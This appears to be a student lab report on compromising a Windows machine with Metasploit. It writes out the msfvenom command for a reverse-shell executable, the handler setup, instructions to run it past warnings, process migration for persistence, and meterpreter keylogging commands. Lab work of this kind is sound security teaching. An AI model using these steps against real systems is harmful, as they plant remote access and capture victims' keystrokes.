# Compromising-windows-using-Metasploit

## NAME:- ESWANTH KUMAR K
## REG NO: 212223040046
Compromising windows using Metasploit

# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
![Screenshot 2024-10-09 085547](https://github.com/user-attachments/assets/99b0b242-a362-4d79-8191-cf1ef85e180f)
Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![Screenshot 2024-10-09 085632](https://github.com/user-attachments/assets/84fd2b37-b819-4075-abae-f8788d96cff2)

copy the fun.exe into the apache /var/www/html folder
![Screenshot 2024-10-09 085644](https://github.com/user-attachments/assets/d43e0241-2413-4cd1-9bb1-dabc3c61ae9a)

Start apache server
sudo systemctl apache2 start
![Screenshot 2024-10-09 085653](https://github.com/user-attachments/assets/7b9fd2df-c645-4a26-b1da-688a2891cbb0)

Check the status of apache2
![Screenshot 2024-10-09 085706](https://github.com/user-attachments/assets/f863dca1-2918-4155-829c-465e4ba57032)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
![Screenshot 2024-10-09 085750](https://github.com/user-attachments/assets/e1dec2c0-9c2d-41b0-bfc6-c05616b2c78d)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2024-10-09 085805](https://github.com/user-attachments/assets/35c636ed-5624-4623-aac5-e7f1bfee917b)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2024-10-09 085815](https://github.com/user-attachments/assets/4b598374-f9b1-4f69-a559-37a6bc9653d8)
To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![Screenshot 2024-10-09 085831](https://github.com/user-attachments/assets/906a9fa0-5f80-4416-b240-eadea5b0c54e)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![Uploading Screenshot 2024-10-09 085846.png…]()

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![Screenshot 2024-10-09 085900](https://github.com/user-attachments/assets/4486eb39-404d-4f3c-a624-3ff490a588b1)
keyscan_dump	Shows the keystrokes captured so far
![Screenshot 2024-10-09 085915](https://github.com/user-attachments/assets/64540148-e668-4845-b4ac-17ca220ed8b2)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
